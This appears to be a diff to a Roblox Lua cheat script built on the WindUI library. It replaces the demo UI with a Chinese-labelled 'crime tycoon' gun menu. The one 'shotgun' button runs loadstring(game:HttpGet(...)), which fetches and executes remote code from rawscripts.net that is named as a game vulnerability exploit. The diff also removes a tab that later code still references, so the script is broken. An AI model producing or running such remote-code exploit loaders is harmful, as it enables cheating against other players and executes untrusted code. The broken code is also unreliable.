@@ -213,93 +213,21 @@ Window:CreateTopbarButton("theme-switcher", "moon", function()
 end, 990)
 
 local Tabs = {
-    Main = Window:Section({ Title = "loc:FEATURES", Opened = true }),
-    Settings = Window:Section({ Title = "loc:SETTINGS", Opened = true }),
-    Utilities = Window:Section({ Title = "loc:UTILITIES", Opened = true })
+    Main = Window:Section({ Title = "犯罪大亨", Opened = true })
 }
 
 local TabHandles = {
-    Elements = Tabs.Main:Tab({ Title = "loc:UI_ELEMENTS", Icon = "layout-grid", Desc = "UI Elements Example" }),
-    Appearance = Tabs.Settings:Tab({ Title = "loc:APPEARANCE", Icon = "brush" }),
-    Config = Tabs.Utilities:Tab({ Title = "loc:CONFIGURATION", Icon = "settings" })
+    Elements = Tabs.Main:Tab({ Title = "装备枪", Icon = "layout-grid", Desc = "装备枪" })
 }
 
-TabHandles.Elements:Paragraph({
-    Title = "Interactive Components",
-    Desc = "Explore WindUI's powerful elements",
-    Image = "component",
-    ImageSize = 20,
-    Color = Color3.fromHex("#30ff6a"),
-})
-
-TabHandles.Elements:Divider()
-
-local toggleState = false
-local featureToggle = TabHandles.Elements:Toggle({
-    Title = "Enable Advanced Features",
-    Desc = "Unlocks additional functionality",
-    Value = false,
-    Callback = function(state) 
-        toggleState = state
-        WindUI:Notify({
-            Title = "Features",
-            Content = state and "Features Enabled" or "Features Disabled",
-            Icon = state and "check" or "x",
-            Duration = 2
-        })
-    end
-})
-
-local intensitySlider = TabHandles.Elements:Slider({
-    Title = "Effect Intensity",
-    Desc = "Adjust the effect strength",
-    Value = { Min = 0, Max = 100, Default = 50 },
-    Callback = function(value)
-        print("Intensity set to:", value)
-    end
-})
-
-local modeDropdown = TabHandles.Elements:Dropdown({
-    Title = "Select Mode",
-    Values = { "Standard", "Advanced", "Expert" },
-    Value = "Standard",
-    Callback = function(option)
-        WindUI:Notify({
-            Title = "Mode Changed",
-            Content = "Selected: "..option,
-            Duration = 2
-        })
-    end
-})
-
-TabHandles.Elements:Divider()
-
 TabHandles.Elements:Button({
-    Title = "Show Notification",
-    Icon = "bell",
+    Title = "散弹枪",
+    Icon = "bell",   --图片
     Callback = function()
-        WindUI:Notify({
-            Title = "Hello WindUI!",
-            Content = "This is a sample notification",
-            Icon = "bell",
-            Duration = 3
-        })
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
     end
 })
 
-TabHandles.Elements:Colorpicker({
-    Title = "Select Color",
-    --Desc = "Select coloe",
-    Default = Color3.fromHex("#30ff6a"),
-    Transparency = 0, -- enable transparency
-    Callback = function(color, transparency)
-        WindUI:Notify({
-            Title = "Color Changed",
-            Content = "New color: "..color:ToHex().."\nTransparency: "..transparency,
-            Duration = 2
-        })
-    end
-})
 
 TabHandles.Appearance:Paragraph({
     Title = "Customize Interface",
